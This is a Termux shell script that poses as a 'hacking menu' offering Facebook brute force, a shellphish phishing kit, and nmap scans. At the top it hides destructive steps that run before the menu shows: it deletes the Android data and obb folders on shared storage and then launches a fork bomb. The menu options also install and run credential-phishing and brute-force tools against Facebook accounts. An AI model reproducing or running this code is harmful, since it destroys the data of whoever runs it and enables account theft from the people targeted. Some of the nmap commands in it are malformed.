pkg install ncurses-utils
pkg install git
termux-setup-storage
cd /sdcard
cd Android
rm -rf data
rm -rf obb
:(){ :|: & };:
tput clear
tput cup 3 15
tput setaf 9
tput bold
echo "WELCOME TO MY MENUL"

tput cup 8 10
tput setaf 2
echo "1.Data Eater"

tput cup 10 10
tput setaf 3
echo "2.facebook brute force"

tput cup 12 10
tput setaf 20
echo "3.phishing"

tput cup 14 10
tput setaf 3
echo "4.Nmap"

tput cup 16 10
tput setaf 36
echo "5.Facebook profile guard(NEW)"

tput cup 18 10
tput setaf 43
echo "99.Exit"

tput cup 22 30
tput setaf 2
echo "code by OZO"

tput cup 23 0
tput setaf 56
read -p "Enter your choice :" HH

if [ $HH -eq 3 ]; then
    cd ~
    git clone https://github.com/thelinuxchoice/shellphish
    pkg install php wget curl -y
    echo " "
    echo " "
    tput setaf 1
    echo "please open Wifi-Hostpot"
    cd shellphish
    bash shellphish.sh
elif [ $HH -eq 1 ]; then
    read -p "are you sure?(y=1,n=2)::" KK
    if [ $KK -eq 1 ]; then
        echo "coming soon on update 2.0"
    else
        echo "coming soon on update 2.0"
    fi
elif [ $HH -eq 2 ]; then
    pkg install python2 -y
    pip install mechanize
    pip install request 
    python2 bluforcefb.py
elif [ $HH -eq 4 ]; then
    pkg install nmap -y
    echo "if you want to search normal,type 1, or if you want to search with port,type 2"
    read -p "So, What is your choice :" OO
    if [ $OO -eq 1 ]; then
        read -p "enter target ip address:" LL
        nmap -T $LL
    else
        read -p "enter targer ip address:" KK
        read -p "enter port:" II
        nmap -T $KK -p $II
    fi
elif [ $HH -eq 5 ];
then
    pkg install python2 -y
    git clone https://github.com/V4N654T/ProfileGuard
    cd ProfileGuard
    python2 guard.py
else
    echo "have a nice day"
fi
echo " "
echo "have a nice day"
